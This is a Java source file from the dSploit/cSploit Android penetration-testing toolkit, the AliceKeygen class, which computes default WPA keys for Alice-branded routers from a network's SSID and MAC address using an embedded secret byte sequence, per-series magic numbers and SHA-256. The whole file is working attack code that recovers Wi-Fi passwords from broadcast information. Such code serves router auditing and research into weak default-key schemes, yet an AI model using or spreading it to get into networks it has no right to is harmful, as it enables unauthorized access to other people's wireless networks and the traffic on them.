/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.wifi.algorithms;

import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.List;

import org.csploit.android.wifi.Keygen;
import org.csploit.android.wifi.algorithms.helpers.AliceMagicInfo;

public class AliceKeygen extends Keygen{

  private MessageDigest md;
  final private String ssidIdentifier;
  final private List<AliceMagicInfo> supportedAlice;

  public AliceKeygen(String ssid, String mac, int level, String enc, List<AliceMagicInfo> supportedAlice){
    super(ssid, mac, level, enc);
    this.ssidIdentifier = ssid.substring(ssid.length() - 8);
    this.supportedAlice = supportedAlice;
  }

  final static private String preInitCharset =
    "0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvWxyz0123";

  final static private byte specialSeq[/*32*/] = {
    0x64, (byte) 0xC6, (byte) 0xDD, (byte) 0xE3,
    (byte) 0xE5, 0x79, (byte) 0xB6, (byte) 0xD9,
    (byte) 0x86, (byte) 0x96, (byte) 0x8D, 0x34,
    0x45, (byte) 0xD2, 0x3B, 0x15,
    (byte) 0xCA, (byte) 0xAF, 0x12, (byte) 0x84,
    0x02, (byte) 0xAC, 0x56, 0x00,
    0x05, (byte) 0xCE, 0x20, 0x75,
    (byte) 0x91, 0x3F, (byte) 0xDC, (byte) 0xE8};

  @Override
  public List<String> getKeys(){
    if(supportedAlice == null || supportedAlice.isEmpty()){
      setErrorMessage("This Alice series is not yet supported!");
      return null;
    }
    try{
      md = MessageDigest.getInstance("SHA-256");
    } catch(NoSuchAlgorithmException e1){
      setErrorMessage("This phone cannot process a SHA256 hash.");
      return null;
    }
    final StringBuilder serialStrBuilder = new StringBuilder();
    for(int j = 0; j < supportedAlice.size(); ++j){/*For pre AGPF 4.5.0sx*/
      serialStrBuilder.append(supportedAlice.get(j).getSerial()).append("X");

      int Q = supportedAlice.get(j).getMagic()[0];
      int k = supportedAlice.get(j).getMagic()[1];
      int serial = (Integer.valueOf(ssidIdentifier) - Q) / k;
      String tmp = Integer.toString(serial);
      for(int i = 0; i < 7 - tmp.length(); i++){
        serialStrBuilder.append("0");
      }
      serialStrBuilder.append(tmp);

      byte[] mac = new byte[6];
      String key = "";
      byte[] hash;

      if(getMacAddress().length() == 12){


        for(int i = 0; i < 12; i += 2)
          mac[i / 2] = (byte) ((Character.digit(getMacAddress().charAt(i), 16) << 4)
            + Character.digit(getMacAddress().charAt(i + 1), 16));

        md.reset();
        md.update(specialSeq);
        try{
          md.update(serialStrBuilder.toString().getBytes("ASCII"));
        } catch(UnsupportedEncodingException e){
          e.printStackTrace();
        }
        md.update(mac);
        hash = md.digest();
        for(int i = 0; i < 24; ++i){
          key += preInitCharset.charAt(hash[i] & 0xFF);
        }
        addPassword(key);
      }

			/*For post AGPF 4.5.0sx*/
      String macEth = getMacAddress().substring(0, 6);
      int extraNumber = 0;
      while(extraNumber <= 9){
        String calc = Integer.toHexString(Integer.valueOf(
          extraNumber + ssidIdentifier)).toUpperCase();
        if(macEth.charAt(5) == calc.charAt(0)){
          macEth += calc.substring(1);
          break;
        }
        extraNumber++;
      }
      if(macEth.equals(getMacAddress().substring(0, 6))){
        return getResults();
      }
      for(int i = 0; i < 12; i += 2)
        mac[i / 2] = (byte) ((Character.digit(macEth.charAt(i), 16) << 4)
          + Character.digit(macEth.charAt(i + 1), 16));
      md.reset();
      md.update(specialSeq);
      try{
        md.update(serialStrBuilder.toString().getBytes("ASCII"));
      } catch(UnsupportedEncodingException e){
        e.printStackTrace();
      }
      md.update(mac);
      key = "";
      hash = md.digest();
      for(int i = 0; i < 24; ++i)
        key += preInitCharset.charAt(hash[i] & 0xFF);
      addPassword(key);
    }
    return getResults();
  }
}
